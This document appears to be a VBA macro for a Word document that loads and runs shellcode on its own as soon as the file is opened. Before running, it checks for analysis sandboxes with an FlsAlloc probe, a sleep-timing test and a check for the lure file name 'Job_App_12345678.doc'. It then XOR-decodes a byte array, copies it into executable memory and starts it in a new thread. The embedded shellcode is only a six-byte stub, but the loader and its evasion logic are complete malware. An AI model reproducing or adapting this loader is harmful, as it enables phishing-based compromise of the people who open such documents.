Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim allocRes As LongPtr

    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        Exit Sub
    End If

    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 10 Then
        Exit Sub
    End If

    If ActiveDocument.Name <> "Job_App_12345678.doc" Then
        Exit Sub
    End If
    
    ' encode with xor key 0x18 (24)
    buf = Array(228, 240, 151, 24, 24, 24)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Caesar cipher decoder
    ' For i = 0 To UBound(buf)
    '    buf(i) = buf(i) - 2
    ' Next i

    ' Perform xor with 0x18/24 as the key
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 24
    Next i
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
